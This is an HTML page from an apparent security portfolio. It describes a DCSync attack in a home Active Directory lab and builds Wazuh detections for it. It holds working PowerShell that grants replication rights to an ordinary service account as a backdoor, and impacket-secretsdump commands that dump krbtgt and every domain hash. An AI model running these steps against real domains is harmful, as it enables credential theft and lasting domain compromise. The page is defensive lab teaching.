@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DCSync | Hunter Weygandt</title>
+    <meta name="description" content="DCSync Attack in the Vulnerable Active Directory Lab">
+    <link rel="stylesheet" href="../../style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <link rel="canonical" href="https://hunterweygandt.com/posts/vulnerable-ad-lab/dcsync.html">
+    <link rel="icon" type="image/x-icon" href="../../favicon.ico">
+    <link rel="icon" type="image/png" sizes="32x32" href="../../favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="../../favicon-16x16.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="../../apple-touch-icon.png">
+</head>
+<body>
+
+    <header>
+        <canvas id="circuit-canvas"></canvas>
+        <div class="header-scrim"></div>
+
+        <div class="terminal-header">
+            <p class="prompt">visitor@hunterweygandt:~$ cat dcsync.html<span class="cursor">|</span></p>
+            <h1>DCSync Attack</h1>
+            <p class="tagline">Vulnerable Active Directory Lab &middot; 2026</p>
+        </div>
+
+        <div class="social-links">
+            <a href="https://github.com/hunterweygandt/Vulnerable-AD-DC-Project---Hunter-Weygandt" target="_blank"><i class="fab fa-github"></i></a>
+        </div>
+    </header>
+
+    <nav>
+        <a href="../../index.html#about">About</a>
+        <a href="../../index.html#skills">Skills</a>
+        <a href="../../index.html#certifications">Certifications</a>
+        <a href="../../index.html#projects">Projects</a>
+        <a href="../../docs.html">Documentation</a>
+    </nav>
+
+    <article>
+        <a class="back-link" href="../vulnerable-ad-lab.html">&larr; Back to the other documents</a>
+
+        <h1>DCSync</h1>
+        <h2>Summary</h2>
+        <p>DCSync abuses Active Directory's replication mechanism, the legitimate process by which domain controllers synchronize data. An account holding the "Replicating Directory Changes" and "Replicating Directory Changes All" extended rights can request replication data, including password hashes, from a real DC while impersonating one. No code runs on the DC and its disk is never touched; the attacker simply asks the DC to hand over secrets over the normal replication protocol. Pulling the krbtgt hash is the endgame: it enables Golden Tickets, forged Kerberos tickets that grant indefinite, undetectable domain persistence.</p>
+        <p><strong>MITRE ATT&CK:</strong> T1003.006 (OS Credential Dumping: DCSync) <strong>Target in this lab:</strong> the entire domain, demonstrated on krbtgt and pprice</p>
+        
+        <h2>The misconfiguration</h2>
+        <p>DCSync requires two extended rights on the domain object: <code>DS-Replication-Get-Changes</code> and <code>DS-Replication-Get-Changes-All</code>. Domain Admins hold these by default, but they can also be granted to any account, which is a common and dangerous persistence technique: an attacker who reaches DA once backdoors a low-profile account with replication rights, so they can re-dump the domain later even if their DA access is revoked.</p>
+        <p>To demonstrate this cleanly, the rights were granted to <code>svc_web</code>, an ordinary non-privileged service account (attacker had already reached Domain Admin via the ACL-abuse part of this lab and used that access to plant this backdoor):</p>
+<pre><code><span class="tok-cmt"># granted on the DC, on the domain object</span>
+<span class="tok-var">$domainDN</span> = (<span class="tok-fn">Get-ADDomain</span>).DistinguishedName
+<span class="tok-var">$acl</span> = <span class="tok-fn">Get-Acl</span> <span class="tok-str">"AD:$domainDN"</span>
+<span class="tok-var">$sid</span> = (<span class="tok-fn">Get-ADUser</span> svc_web).SID
+<span class="tok-var">$getChanges</span>    = <span class="tok-type">[guid]</span><span class="tok-str">"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"</span>
+<span class="tok-var">$getChangesAll</span> = <span class="tok-type">[guid]</span><span class="tok-str">"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"</span>
+foreach (<span class="tok-var">$right</span> in @(<span class="tok-var">$getChanges</span>, <span class="tok-var">$getChangesAll</span>)) {
+    <span class="tok-var">$ace</span> = <span class="tok-fn">New-Object</span> System.DirectoryServices.ActiveDirectoryAccessRule(
+        <span class="tok-var">$sid</span>,
+        <span class="tok-type">[System.DirectoryServices.ActiveDirectoryRights]</span>::ExtendedRight,
+        <span class="tok-type">[System.Security.AccessControl.AccessControlType]</span>::Allow,
+        <span class="tok-var">$right</span>)
+    <span class="tok-var">$acl</span>.AddAccessRule(<span class="tok-var">$ace</span>)
+}
+<span class="tok-fn">Set-Acl</span> <span class="tok-param">-Path</span> <span class="tok-str">"AD:$domainDN"</span> <span class="tok-param">-AclObject</span> <span class="tok-var">$acl</span></code></pre>
+
+        <h2>Execution</h2>
+        <p>From Kali, authenticating as <code>svc_web</code> (the backdoored non-admin), Impacket's secretsdump performs the DCSync:</p>
+<pre><code><span class="tok-cmt"># the crown jewel: krbtgt (Golden Ticket key)</span>
+<span class="tok-cmd">impacket-secretsdump</span> ecorp.local/svc_web:<span class="tok-str">'LabP@ssw0rd!2025'</span>@10.0.0.88 <span class="tok-param">-just-dc-user</span> krbtgt
+
+<span class="tok-cmt"># the narrative trophy: Phillip Price, E Corp CEO</span>
+<span class="tok-cmd">impacket-secretsdump</span> ecorp.local/svc_web:<span class="tok-str">'LabP@ssw0rd!2025'</span>@10.0.0.88 <span class="tok-param">-just-dc-user</span> pprice
+
+<span class="tok-cmt"># or the entire domain</span>
+<span class="tok-cmd">impacket-secretsdump</span> ecorp.local/svc_web:<span class="tok-str">'LabP@ssw0rd!2025'</span>@10.0.0.88 <span class="tok-param">-just-dc</span></code></pre>
+        <figure>
+            <img src="../../images/vulnerable-ad-lab-images/DCSync-Attack.png" alt="Kali terminal running impacket-secretsdump as svc_web against the ecorp.local DC three times. The first pulls the krbtgt account, grabbing its NTLM hash and AES256/AES128/DES Kerberos keys - the Golden Ticket key. The second pulls pprice (the CEO trophy account) and its keys. The third uses -just-dc to replicate the entire domain, dumping NTLM hashes for every account: Administrator and Guest (redacted), krbtgt, and the full roster of ecorp.local users. Each run reports the DRSUAPI replication method and 'Cleaning up'.">
+            <figcaption>DCSync in full: as <code>svc_web</code>, <code>secretsdump</code> uses the replication rights from the setup to pull the <code>krbtgt</code> key (the Golden Ticket seed), then <code>pprice</code>, then the entire domain via <code>-just-dc</code>. No code runs on the DC - it's abusing legitimate replication, which is exactly why detecting it means watching for the replication request itself.</figcaption>
+        </figure>
+        <p>The output is NTLM hashes (<code>user:RID:LM:NTLM:::</code>). Obtaining krbtgt's hash means total domain compromise: the attacker can forge Golden Tickets and persist indefinitely. By pulling Price's hash, fsociety owns E Corp's CEO. The full kill chain is now complete: sprayed employee credential -> helpdesk account -> ACL abuse -> Domain Admin -> replication backdoor -> every hash in the domain.</p>
+
+        <h2>Telemetry generated</h2>
+        <p>Two footprints, matching the two stages:</p>
+        <p><strong>Stage 1, the rights being granted (setup) -> Event 5136</strong></p>
+        <p>The replication rights being added to svc_web are recorded as a DACL modification on the domain object. In the event's SDDL value, svc_web's SID appears paired with both replication GUIDs.</p>
+        <div class="table-scroll">
+            <table class="attacks-table">
+                <thead>
+                    <tr>
+                        <th>Field</th>
+                        <th>Value</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td class="mono"><code>win.system.eventID</code></td>
+                        <td class="mono">5136</td>
+                    </tr>
+                    <tr>
+                        <td class="mono"><code>win.eventdata.objectClass</code></td>
+                        <td class="mono">domainDNS <span style="color:#9a9aa6">(the domain head)</span></td>
+                    </tr>
+                    <tr>
+                        <td class="mono"><code>win.eventdata.attributeLDAPDisplayName</code></td>
+                        <td class="mono">nTSecurityDescriptor</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+        <p></p>
+        <p><strong>Stage 2, the DCSync itself -> Event 4662</strong></p>
+        <div class="table-scroll">
+            <table class="attacks-table">
+                <thead>
+                    <tr>
+                        <th>Field</th>
+                        <th>Value</th>
+                        <th>Why it matters</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td class="mono"><code>win.system.eventID</code></td>
+                        <td class="mono">4662</td>
+                        <td>Operation performed on an object</td>
+                    </tr>
+                    <tr>
+                        <td class="mono"><code>win.eventdata.subjectUserName</code></td>
+                        <td class="mono">svc_web</td>
+                        <td>The requesting account</td>
+                    </tr>
+                    <tr>
+                        <td class="mono"><code>win.eventdata.properties</code></td>
+                        <td class="mono">&hellip;{1131f6aa&hellip;} / {1131f6ad&hellip;}</td>
+                        <td>The replication GUIDs</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+        <p>The replication GUIDs in the <code>win.eventdata.properties</code> field are the DCSync signature.</p>
+
+        <h2>Detection</h2>
+        <p>This part of the lab exposed the most important detection lesson in this lab: <strong>DCSync is often invisible by default.</strong></p>
+        <p>When first checked, the DCSync 4662 events were reaching the Wazuh manager (confirmed in archives) but were not producing any alert, the stock ruleset has no rule that surfaces replication-GUID access. 4662 is an extremely high-volume event, so it is generally left unalerted. The result is that one of the most severe AD attacks, full credential extraction, generates no alert in a default configuration. Many real environments do not detect DCSync at all until it is too late. Building the rule to close this gap is the core of this.</p>
+        <p>The detection also required the sharpest false-positive handling in the lab. Domain controllers perform replication constantly and legitimately, generating 4662 events with the exact same replication GUIDs. An archived example showed the DC's own machine account (<code>DC-VULN$</code>, SID S-1-5-18 / SYSTEM) doing normal replication. A naive "alert on the replication GUID" rule would fire on every one of these. The fix: alert on the GUID but EXCLUDE machine accounts. Legitimate replication comes from domain controllers, whose accounts end in <code>$</code>; a DCSync attack comes from a user account (svc_web), which does not.</p>
+        <p>Custom rules (<code>/var/ossec/etc/rules/local_rules.xml</code>):</p>
+<pre><code><span class="tok-punc">&lt;</span><span class="tok-tag">group</span> <span class="tok-attr">name</span>=<span class="tok-str">"dcsync,credential_access,attack,windows,"</span><span class="tok-punc">&gt;</span>
+
+  <span class="tok-cmt">&lt;!-- DCSync: replication requested by a non-DC account (the abuse) --&gt;</span>
+  <span class="tok-punc">&lt;</span><span class="tok-tag">rule</span> <span class="tok-attr">id</span>=<span class="tok-str">"100230"</span> <span class="tok-attr">level</span>=<span class="tok-str">"13"</span><span class="tok-punc">&gt;</span>
+    <span class="tok-punc">&lt;</span><span class="tok-tag">if_sid</span><span class="tok-punc">&gt;</span>60103<span class="tok-punc">&lt;/</span><span class="tok-tag">if_sid</span><span class="tok-punc">&gt;</span>
+    <span class="tok-punc">&lt;</span><span class="tok-tag">field</span> <span class="tok-attr">name</span>=<span class="tok-str">"win.system.eventID"</span><span class="tok-punc">&gt;</span>^4662$<span class="tok-punc">&lt;/</span><span class="tok-tag">field</span><span class="tok-punc">&gt;</span>
+    <span class="tok-punc">&lt;</span><span class="tok-tag">field</span> <span class="tok-attr">name</span>=<span class="tok-str">"win.eventdata.properties"</span><span class="tok-punc">&gt;</span>1131f6aa|1131f6ad<span class="tok-punc">&lt;/</span><span class="tok-tag">field</span><span class="tok-punc">&gt;</span>
+    <span class="tok-punc">&lt;</span><span class="tok-tag">field</span> <span class="tok-attr">name</span>=<span class="tok-str">"win.eventdata.subjectUserName"</span> <span class="tok-attr">negate</span>=<span class="tok-str">"yes"</span><span class="tok-punc">&gt;</span>\$$<span class="tok-punc">&lt;/</span><span class="tok-tag">field</span><span class="tok-punc">&gt;</span>
+    <span class="tok-punc">&lt;</span><span class="tok-tag">description</span><span class="tok-punc">&gt;</span>Possible DCSync: directory replication requested by non-DC account <span class="tok-var">$(win.eventdata.subjectUserName)</span><span class="tok-punc">&lt;/</span><span class="tok-tag">description</span><span class="tok-punc">&gt;</span>
+    <span class="tok-punc">&lt;</span><span class="tok-tag">mitre</span><span class="tok-punc">&gt;</span><span class="tok-punc">&lt;</span><span class="tok-tag">id</span><span class="tok-punc">&gt;</span>T1003.006<span class="tok-punc">&lt;/</span><span class="tok-tag">id</span><span class="tok-punc">&gt;</span><span class="tok-punc">&lt;/</span><span class="tok-tag">mitre</span><span class="tok-punc">&gt;</span>
+  <span class="tok-punc">&lt;/</span><span class="tok-tag">rule</span><span class="tok-punc">&gt;</span>
+
+  <span class="tok-cmt">&lt;!-- DCSync: DACL modified on the domain head (the rights grant) --&gt;</span>
+  <span class="tok-punc">&lt;</span><span class="tok-tag">rule</span> <span class="tok-attr">id</span>=<span class="tok-str">"100231"</span> <span class="tok-attr">level</span>=<span class="tok-str">"12"</span><span class="tok-punc">&gt;</span>
+    <span class="tok-punc">&lt;</span><span class="tok-tag">if_sid</span><span class="tok-punc">&gt;</span>60103<span class="tok-punc">&lt;/</span><span class="tok-tag">if_sid</span><span class="tok-punc">&gt;</span>
+    <span class="tok-punc">&lt;</span><span class="tok-tag">field</span> <span class="tok-attr">name</span>=<span class="tok-str">"win.system.eventID"</span><span class="tok-punc">&gt;</span>^5136$<span class="tok-punc">&lt;/</span><span class="tok-tag">field</span><span class="tok-punc">&gt;</span>
+    <span class="tok-punc">&lt;</span><span class="tok-tag">field</span> <span class="tok-attr">name</span>=<span class="tok-str">"win.eventdata.objectClass"</span><span class="tok-punc">&gt;</span>^domainDNS$<span class="tok-punc">&lt;/</span><span class="tok-tag">field</span><span class="tok-punc">&gt;</span>
+    <span class="tok-punc">&lt;</span><span class="tok-tag">field</span> <span class="tok-attr">name</span>=<span class="tok-str">"win.eventdata.attributeLDAPDisplayName"</span><span class="tok-punc">&gt;</span>^nTSecurityDescriptor$<span class="tok-punc">&lt;/</span><span class="tok-tag">field</span><span class="tok-punc">&gt;</span>
+    <span class="tok-punc">&lt;</span><span class="tok-tag">description</span><span class="tok-punc">&gt;</span>DACL modified on domain object <span class="tok-var">$(win.eventdata.objectDN)</span> - possible DCSync rights grant<span class="tok-punc">&lt;/</span><span class="tok-tag">description</span><span class="tok-punc">&gt;</span>
+    <span class="tok-punc">&lt;</span><span class="tok-tag">mitre</span><span class="tok-punc">&gt;</span><span class="tok-punc">&lt;</span><span class="tok-tag">id</span><span class="tok-punc">&gt;</span>T1003.006<span class="tok-punc">&lt;/</span><span class="tok-tag">id</span><span class="tok-punc">&gt;</span><span class="tok-punc">&lt;/</span><span class="tok-tag">mitre</span><span class="tok-punc">&gt;</span>
+  <span class="tok-punc">&lt;/</span><span class="tok-tag">rule</span><span class="tok-punc">&gt;</span>
+
+<span class="tok-punc">&lt;/</span><span class="tok-tag">group</span><span class="tok-punc">&gt;</span></code></pre>
+        <p></p>
+        <p>Rule design notes:</p>
+        <ul>
+            <li><strong>Rule 100230:</strong> Matches the replication GUID, then excludes machine accounts</strong> via <code>negate="yes"</code> on <code>\$$</code>. This single exclusion is what makes the rule usable: it filters out all legitimate DC-to-DC replication (from <code>$</code>-suffixed computer accounts) and leaves only replication from user accounts, the DCSync fingerprint. Level 13, the highest in the lab, because non-DC replication is domain-total-compromise.</li>
+            <li><strong>100231 scopes to <code>domainDNS</code></strong>, so it only fires on DACL changes to the domain head where replication rights are granted, not on every object.</li>
+            <li><strong>Two-stage coverage:</strong> 100231 catches the backdoor being planted, 100230 catches it being used.</li>
+        </ul>
+        <p>Results: both rules fired, 100230 at level 13 (DCSync by svc_web), 100231 at level 12 (rights granted on the domain object).</p>
+        <figure>
+            <img src="../../images/vulnerable-ad-lab-images/DCSync-Wazuh.png" alt="Wazuh Threat Hunting dashboard on the DC-VULN agent, filtered to rule.id 100230 or 100231, showing 9 hits. Six events fire rule 100231 (level 12, event 5136) with 'DACL modified on domain object DC=ecorp,DC=local - possible DCSync rights grant', and three fire rule 100230 (level 13, event 4662) with 'Possible DCSync: directory replication requested by non-DC account svc_web'. Both the rights-grant and the replication-abuse detections land - the two-point coverage the stock ruleset misses.">
+            <figcaption>Both DCSync detections fire: rule <code>100231</code> catches the DACL grant on the domain head (event 5136), and rule <code>100230</code> catches the replication itself (event 4662) requested by the non-DC account <code>svc_web</code>. The plant and the abuse are each caught independently.</figcaption>
+        </figure>
+        <p><strong>False positives / tuning:</strong> the machine-account exclusion handles the main source (legitimate DC replication), but Azure AD Connect / entra sync accounts and some backup solutions also legitimately hold replication rights and are user accounts. In production, those known-good accounts should be allowlisted by name rather than relying solely on the <code>$</code> exclusion.</p>
+
+        <h2>Remediation</h2>
+        <ul>
+            <li>Audit which principals hold <code>DS-Replication-Get-Changes-All</code> on the domain object; it should be only domain controllers and known sync services.</li>
+            <li>Remove replication rights from any user/service account that shouldn't have them.</li>
+            <li>If krbtgt may have been dumped, rotate the krbtgt password TWICE (the double rotation invalidates existing Golden Tickets).</li>
+            <li>Monitor for replication from non-DC accounts (rule 100230) and for replication rights being granted (rule 100231).</li>
+        </ul>
+
+        <h2>Notes/Troubleshooting</h2>
+        <ul>
+            <li><strong>DCSync was invisible until a custom rule was written.</strong> The 4662 events reached the manager but the stock ruleset never alerted on them.</li>
+            <li><strong>False positives from legitimate DC replication.</strong> Real DCs generate the same replication-GUID 4662s constantly (observed from <code>DC-VULN$</code> / <code>SYSTEM</code>). The machine-account exclusion (<code>negate</code> on <code>$</code>) is what separates attack from normal operation.</li>
+            <li><strong>The GUID lives in <code>win.eventdata.properties</code></strong> as a string with a <code>%%7688</code> prefix; a substring match on the GUID works.</li>
+        </ul>
+
+        <a class="back-link" href="../vulnerable-ad-lab.html">&larr; Back to the other documents</a>
+    </article>
+
+    <footer>
+        <p>&copy; 2026 Hunter Weygandt</p>
+    </footer>
+
+    <script src="../../circuit.js"></script>
+
+</body>
+</html>
